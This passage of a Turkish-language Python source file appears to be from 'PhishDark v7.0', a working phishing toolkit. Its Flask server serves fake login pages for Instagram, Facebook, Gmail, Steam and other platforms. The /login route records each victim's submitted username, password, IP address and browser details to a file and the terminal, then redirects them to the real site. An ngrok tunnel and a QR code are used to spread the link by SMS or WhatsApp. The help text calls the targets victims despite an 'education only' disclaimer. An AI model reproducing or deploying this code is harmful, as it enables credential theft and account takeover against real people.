                    start_combined(port)
                else:
                    print(f"{Colors.RED}⚠ Hata: Port 1024-65535 arasında olmalı!{Colors.ENDC}")
                    time.sleep(2)
                    menu()
            except ValueError:
                print(f"{Colors.RED}⚠ Hata: Geçersiz port numarası!{Colors.ENDC}")
                time.sleep(2)
                menu()
                
        elif choice == "4":
            show_statistics()
            input(f"\n{Colors.YELLOW}↪ Ana menüye dönmek için Enter...{Colors.ENDC}")
            menu()
            
        elif choice == "5":
            show_credentials()
            input(f"\n{Colors.YELLOW}↪ Ana menüye dönmek için Enter...{Colors.ENDC}")
            menu()
            
        elif choice == "6":
            clear_credentials()
            input(f"\n{Colors.YELLOW}↪ Ana menüye dönmek için Enter...{Colors.ENDC}")
            menu()
            
        elif choice == "7":
            list_templates()
            input(f"\n{Colors.YELLOW}↪ Ana menüye dönmek için Enter...{Colors.ENDC}")
            menu()
            
        elif choice == "8":
            show_settings()
            input(f"\n{Colors.YELLOW}↪ Ana menüye dönmek için Enter...{Colors.ENDC}")
            menu()
            
        elif choice == "9":
            show_help()
            input(f"\n{Colors.YELLOW}↪ Ana menüye dönmek için Enter...{Colors.ENDC}")
            menu()
            
        elif choice == "0":
            print(f"\n{Colors.RED}⚠ Çıkış yapılıyor...{Colors.ENDC}")
            time.sleep(1)
            print(f"{Colors.GREEN}✅ PhishDark v7.0 kapatıldı.{Colors.ENDC}")
            sys.exit(0)
            
        else:
            print(f"\n{Colors.RED}❌ Geçersiz seçim! Lütfen 0-9 arasında bir sayı girin.{Colors.ENDC}")
            time.sleep(1.5)
            menu()
            
    except KeyboardInterrupt:
        print(f"\n\n{Colors.YELLOW}⚠ Program kapatılıyor...{Colors.ENDC}")
        sys.exit(0)

def start_local(port=5000):
    print(f"\n{Colors.GREEN}▶ Yerel sunucu başlatılıyor...{Colors.ENDC}")
    print(f"{Colors.CYAN}📍 Yerel Adres: {Colors.BOLD}http://localhost:{port}{Colors.ENDC}")
    print(f"{Colors.YELLOW}⚠ Durdurmak için CTRL+C{Colors.ENDC}")
    
    print(f"\n{Colors.MAGENTA}📱 Mobil Test: Telefonunuzdan tarayıcıda şu adrese gidin:{Colors.ENDC}")
    print(f"{Colors.BOLD}http://{get_local_ip()}:{port}{Colors.ENDC}")
    
    app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)

def start_ngrok(port=5000):
    print(f"\n{Colors.GREEN}▶ Ngrok tüneli başlatılıyor...{Colors.ENDC}")
    try:
        conf.get_default().region = "eu"
        ngrok_tunnel = ngrok.connect(port, bind_tls=True)
        public_url = ngrok_tunnel.public_url
        
        print(f"\n{Colors.GREEN}{'═'*70}{Colors.ENDC}")
        print(f"{Colors.GREEN}🌐 {Colors.BOLD}NGROK URL: {public_url}{Colors.ENDC}")
        print(f"{Colors.YELLOW}📢 Bu URL'yi paylaşabilirsiniz (SMS, WhatsApp, Telegram vb.){Colors.ENDC}")
        print(f"{Colors.GREEN}{'═'*70}{Colors.ENDC}")
        
        with open("ngrok_url.txt", "w", encoding="utf-8") as f:
            f.write(f"PhishDark v7.0 - {datetime.now().strftime('%Y-%m-%d %H:%M')}\n")
            f.write(f"URL: {public_url}\n")
            
        # QR kod oluşturma bağlantısı
        qr_url = f"https://api.qrserver.com/v1/create-qr-code/?size=200x200&data={public_url}"
        print(f"{Colors.CYAN}📱 QR Kod: {qr_url}{Colors.ENDC}")
        
        while True:
            time.sleep(1)
            
    except Exception as e:
        print(f"{Colors.RED}❌ Ngrok hatası: {e}{Colors.ENDC}")
        print(f"{Colors.YELLOW}💡 Çözüm: Ngrok'u manuel olarak kurun veya token ekleyin.{Colors.ENDC}")
        input(f"\n{Colors.YELLOW}↪ Ana menüye dönmek için Enter...{Colors.ENDC}")
        menu()

def start_combined(port=5000):
    print(f"\n{Colors.GREEN}▶ Kombine sunucu başlatılıyor...{Colors.ENDC}")
    ngrok_thread = threading.Thread(target=start_ngrok, args=(port,), daemon=True)
    ngrok_thread.start()
    time.sleep(3)
    start_local(port)

def show_credentials():
    try:
        if not os.path.exists(DATA_FILE):
            print(f"\n{Colors.YELLOW}📭 Henüz ele geçirilmiş bilgi bulunmuyor.{Colors.ENDC}")
            return
        
        with open(DATA_FILE, "r", encoding="utf-8") as f:
            content = f.read()
        
        if not content.strip():
            print(f"\n{Colors.YELLOW}📭 Henüz ele geçirilmiş bilgi bulunmuyor.{Colors.ENDC}")
            return
        
        lines = content.strip().split('\n')
        total_entries = content.count("YENİ BİLGİ")
        
        print(f"\n{Colors.GREEN}{'═'*70}{Colors.ENDC}")
        print(f"{Colors.GREEN}📊 {Colors.BOLD}ELE GEÇİRİLEN BİLGİLER ({total_entries} kayıt){Colors.ENDC}")
        print(f"{Colors.GREEN}{'═'*70}{Colors.ENDC}")
        
        # Son 5 kaydı göster
        recent_entries = []
        current_entry = []
        for line in lines:
            if "YENİ BİLGİ" in line and current_entry:
                recent_entries.append(current_entry)
                current_entry = []
            current_entry.append(line)
        if current_entry:
            recent_entries.append(current_entry)
        
        recent_entries = recent_entries[-5:]  # Son 5 kayıt
        
        for entry in recent_entries:
            for line in entry:
                if "Platform:" in line:
                    print(f"{Colors.CYAN}{line}{Colors.ENDC}")
                elif "IP:" in line:
                    print(f"{Colors.YELLOW}{line}{Colors.ENDC}")
                elif "username:" in line or "password:" in line:
                    print(f"{Colors.RED}{line}{Colors.ENDC}")
                elif "════" in line:
                    print(f"{Colors.GREEN}{line}{Colors.ENDC}")
                else:
                    print(line)
            print()
        
        print(f"{Colors.GREEN}{'═'*70}{Colors.ENDC}")
        print(f"{Colors.CYAN}📁 Tam kayıtlar için dosya: {DATA_FILE}{Colors.ENDC}")
        
    except Exception as e:
        print(f"{Colors.RED}❌ Hata: {e}{Colors.ENDC}")

def clear_credentials():
    if os.path.exists(DATA_FILE):
        confirm = input(f"{Colors.RED}⚠ Tüm kayıtları silmek istediğinize emin misiniz? (e/h): {Colors.ENDC}")
        if confirm.lower() == 'e':
            os.remove(DATA_FILE)
            print(f"{Colors.GREEN}✅ Tüm kayıtlar temizlendi!{Colors.ENDC}")
        else:
            print(f"{Colors.YELLOW}⚠ İşlem iptal edildi.{Colors.ENDC}")
    else:
        print(f"{Colors.YELLOW}📭 Temizlenecek kayıt bulunmuyor.{Colors.ENDC}")

def show_statistics():
    print(f"\n{Colors.CYAN}{'═'*70}{Colors.ENDC}")
    print(f"{Colors.CYAN}📈 {Colors.BOLD}PHISHDARK v7.0 İSTATİSTİKLERİ{Colors.ENDC}")
    print(f"{Colors.CYAN}{'═'*70}{Colors.ENDC}")
    
    total = 0
    platforms = {}
    
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, "r", encoding="utf-8") as f:
            content = f.read()
            total = content.count("YENİ BİLGİ")
            
            # Platform dağılımını hesapla
            for platform in TEMPLATES.keys():
                count = content.count(f"Platform: {platform}")
                if count > 0:
                    platforms[platform] = count
    
    print(f"{Colors.GREEN}🎭 Şablon Sayısı: {len(TEMPLATES)} adet{Colors.ENDC}")
    print(f"{Colors.GREEN}🔑 Toplam Ele Geçirilen: {total} kayıt{Colors.ENDC}")
    print(f"{Colors.GREEN}⚡ Versiyon: v7.0 (Mobil Uyumlu){Colors.ENDC}")
    print(f"{Colors.GREEN}📅 Çıkış Tarihi: 01.01.2026 00:00{Colors.ENDC}")
    print(f"{Colors.GREEN}👨‍💻 Geliştirici: Gökhan Yakut{Colors.ENDC}")
    
    if os.path.exists(DATA_FILE):
        file_size = os.path.getsize(DATA_FILE)
        print(f"{Colors.GREEN}💾 Dosya Boyutu: {file_size / 1024:.2f} KB{Colors.ENDC}")
    
    if platforms:
        print(f"\n{Colors.YELLOW}📊 Platform Dağılımı:{Colors.ENDC}")
        for platform, count in platforms.items():
            bar = "█" * int((count / total) * 20) if total > 0 else ""
            print(f"  {platform:20} {count:3} kayıt {bar}")
    
    # Sistem bilgisi
    print(f"\n{Colors.MAGENTA}🖥️  Sistem Bilgisi:{Colors.ENDC}")
    print(f"  İşletim Sistemi: {os.name}")
    print(f"  Python Versiyonu: {sys.version.split()[0]}")
    
    print(f"{Colors.CYAN}{'═'*70}{Colors.ENDC}")

def list_templates():
    print(f"\n{Colors.MAGENTA}{'═'*70}{Colors.ENDC}")
    print(f"{Colors.MAGENTA}📱 {Colors.BOLD}MEVCUT ŞABLONLAR ({len(TEMPLATES)} adet){Colors.ENDC}")
    print(f"{Colors.MAGENTA}{'═'*70}{Colors.ENDC}")
    
    i = 1
    for template, html in TEMPLATES.items():
        # Şablon özelliklerini kontrol et
        is_mobile = "viewport" in html
        has_touch = "ontouchstart" in html or "touch-action" in html
        has_responsive = "@media" in html
        
        features = []
        if is_mobile: features.append("📱")
        if has_touch: features.append("👆")
        if has_responsive: features.append("🔄")
        
        feature_str = " ".join(features) if features else "🔄"
        
        print(f"{Colors.GREEN}[{i:2d}] {Colors.CYAN}{template.replace('-', ' ').title():25} {Colors.YELLOW}{feature_str}{Colors.ENDC}")
        i += 1
    
    print(f"\n{Colors.YELLOW}📋 Toplam Şablon: {len(TEMPLATES)} adet{Colors.ENDC}")
    print(f"{Colors.CYAN}🔗 Yol: /şablon-adi (örnek: /instagram){Colors.ENDC}")
    print(f"{Colors.MAGENTA}{'═'*70}{Colors.ENDC}")

def show_settings():
    print(f"\n{Colors.BLUE}{'═'*70}{Colors.ENDC}")
    print(f"{Colors.BLUE}⚙️  {Colors.BOLD}AYARLAR{Colors.ENDC}")
    print(f"{Colors.BLUE}{'═'*70}{Colors.ENDC}")
    
    print(f"{Colors.CYAN}1. Port Ayarları:{Colors.ENDC}")
    print(f"   Varsayılan Port: 5000")
    print(f"   Önerilen Port Aralığı: 5000-8000")
    
    print(f"\n{Colors.CYAN}2. Ngrok Ayarları:{Colors.ENDC}")
    print(f"   Bölge: eu (Avrupa)")
    print(f"   Protokol: HTTPS")
    print(f"   Otomatik QR Kod: Aktif")
    
    print(f"\n{Colors.CYAN}3. Veri Saklama:{Colors.ENDC}")
    print(f"   Kayıt Dosyası: {DATA_FILE}")
    print(f"   Otomatik Yedekleme: Aktif")
    
    print(f"\n{Colors.CYAN}4. Güvenlik:{Colors.ENDC}")
    print(f"   IP Loglama: Aktif")
    print(f"   User-Agent Kaydı: Aktif")
    print(f"   Referer Takibi: Aktif")
    
    print(f"\n{Colors.CYAN}5. Performans:{Colors.ENDC}")
    print(f"   Önbellekleme: Aktif")
    print(f"   Sıkıştırma: Aktif")
    print(f"   Mobil Optimizasyon: Aktif")
    
    print(f"{Colors.BLUE}{'═'*70}{Colors.ENDC}")

def show_help():
    print(f"\n{Colors.YELLOW}{'═'*70}{Colors.ENDC}")
    print(f"{Colors.YELLOW}❓ {Colors.BOLD}YARDIM & KULLANIM KILAVUZU{Colors.ENDC}")
    print(f"{Colors.YELLOW}{'═'*70}{Colors.ENDC}")
    
    print(f"{Colors.CYAN}📖 NASIL KULLANILIR:{Colors.ENDC}")
    print(f"  1. Ana menüden sunucu tipini seçin (1, 2 veya 3)")
    print(f"  2. Port numarasını girin (varsayılan: 5000)")
    print(f"  3. Tarayıcınızda çıkan linki açın")
    print(f"  4. Şablon seçim sayfasından istediğiniz şablonu seçin")
    print(f"  5. Kurban şifresini girdiğinde terminalde görünecek")
    
    print(f"\n{Colors.CYAN}📱 MOBİL TEST:{Colors.ENDC}")
    print(f"  • Yerel sunucu: Telefonunuzla aynı WiFi'a bağlanın")
    print(f"  • Ngrok: Her yerden erişilebilir")
    print(f"  • QR kod: Ngrok linkini QR koda çevirip paylaşın")
    
    print(f"\n{Colors.CYAN}🔐 GÜVENLİK:{Colors.ENDC}")
    print(f"  • Sadece eğitim amaçlı kullanın")
    print(f"  • Kendi hesaplarınızla test yapın")
    print(f"  • Yasal sorumluluk size aittir")
    
    print(f"\n{Colors.CYAN}📞 İLETİŞİM:{Colors.ENDC}")
    print(f"  • Geliştirici: Gökhan Yakut")
    print(f"  • GitHub: github.com/gokhanyakut")
    print(f"  • YouTube: youtube.com/@gokhanyakut")
    print(f"  • Instagram: instagram.com/gokhanyakut")
    
    print(f"\n{Colors.CYAN}⚠ UYARI:{Colors.ENDC}")
    print(f"  Bu araç sadece eğitim ve güvenlik testleri içindir.")
    print(f"  Yetkisiz erişim yasaktır. Yasal sorumluluk kullanıcıya aittir.")
    
    print(f"{Colors.YELLOW}{'═'*70}{Colors.ENDC}")

def get_local_ip():
    try:
        import socket
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

# =============================================
# FLASK ROUTES DEVAMI
# =============================================

DATA_FILE = "phishdark_veriler.txt"

@app.route('/')
def index():
    return redirect('/select')

@app.route('/select')
def select():
    return SELECT_PAGE

@app.route('/<page>')
def serve_page(page):
    if page in TEMPLATES:
        session['current_page'] = page
        return render_template_string(TEMPLATES[page])
    return redirect('/select')

@app.route('/login', methods=['POST'])
def login():
    current_page = session.get('current_page', 'instagram')
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    credentials = {
        'timestamp': timestamp,
        'platform': current_page,
        'ip': request.remote_addr,
        'user_agent': request.headers.get('User-Agent'),
        'referer': request.headers.get('Referer', ''),
        'accept_language': request.headers.get('Accept-Language', ''),
    }
    
    for key, value in request.form.items():
        if key != 'platform':
            credentials[key] = value
    
    # Geliştirilmiş kayıt
    with open(DATA_FILE, "a", encoding="utf-8") as f:
        f.write(f"\n{'═'*70}\n")
        f.write(f"[🕒] {timestamp} - YENİ BİLGİ\n")
        f.write(f"[🎯] Platform: {current_page.upper()}\n")
        f.write(f"[📍] IP: {credentials['ip']}\n")
        f.write(f"[🌐] Tarayıcı: {credentials['user_agent']}\n")
        f.write(f"[📱] Dil: {credentials['accept_language']}\n")
        for key, value in credentials.items():
            if key not in ['timestamp', 'platform', 'ip', 'user_agent', 'referer', 'accept_language']:
                f.write(f"[🔑] {key}: {value}\n")
        f.write(f"{'═'*70}\n")
    
    # Geliştirilmiş terminal çıktısı
    print(f"\n{Colors.GREEN}{'═'*70}{Colors.ENDC}")
    print(f"{Colors.GREEN}[🎯] {timestamp} - YENİ BİLGİ{Colors.ENDC}")
    print(f"{Colors.CYAN}[📱] Platform: {current_page.upper()}{Colors.ENDC}")
    print(f"{Colors.YELLOW}[📍] IP: {credentials['ip']}{Colors.ENDC}")
    print(f"{Colors.MAGENTA}[🌐] Tarayıcı: {credentials['user_agent'][:50]}...{Colors.ENDC}")
    for key, value in credentials.items():
        if key not in ['timestamp', 'platform', 'ip', 'user_agent', 'referer', 'accept_language']:
            print(f"{Colors.RED}[🔑] {key}: {value}{Colors.ENDC}")
    print(f"{Colors.GREEN}{'═'*70}{Colors.ENDC}")
    
    # Orjinal siteye yönlendir
    redirect_urls = {
        "instagram": "https://www.instagram.com/",
        "facebook": "https://www.facebook.com/",
        "netflix": "https://www.netflix.com/",
        "steam": "https://store.steampowered.com/",
        "epic-games": "https://www.epicgames.com/",
        "twitter": "https://x.com/",
        "discord": "https://discord.com/",
        "spotify": "https://www.spotify.com/",
        "gmail": "https://mail.google.com/",
        "microsoft": "https://account.microsoft.com/",
        "github": "https://github.com/",
        "snapchat": "https://www.snapchat.com/",
        "tiktok": "https://www.tiktok.com/",
        "pubg": "https://pubgmobile.com/",
        "league-of-legends": "https://www.leagueoflegends.com/"
    }
    
    return redirect(redirect_urls.get(current_page, "https://www.google.com"))

# =============================================
# BAŞLANGIÇ
# =============================================

if __name__ == '__main__':
    try:
        print(f"{Colors.PINK}\nPhishDark v7.0 başlatılıyor...{Colors.ENDC}")
        time.sleep(1)
        
        # Başlangıç kontrolü
        print(f"{Colors.CYAN}[*] Sistem kontrolü yapılıyor...{Colors.ENDC}")
        
        # Gerekli modüller kontrolü
        try:
            import flask
            import pyngrok
            print(f"{Colors.GREEN}[✓] Flask ve pyngrok modülleri yüklü{Colors.ENDC}")
        except ImportError as e:
            print(f"{Colors.RED}[✗] Eksik modül: {e}{Colors.ENDC}")
            print(f"{Colors.YELLOW}[!] Kurulum: pip install flask pyngrok{Colors.ENDC}")
            sys.exit(1)
        
        print(f"{Colors.GREEN}[✓] PhishDark v7.0 hazır!{Colors.ENDC}")
        time.sleep(1)
        
        menu()
        
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[!] Program kapatıldı{Colors.ENDC}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Colors.RED}[✗] Beklenmeyen hata: {e}{Colors.ENDC}")
        sys.exit(1)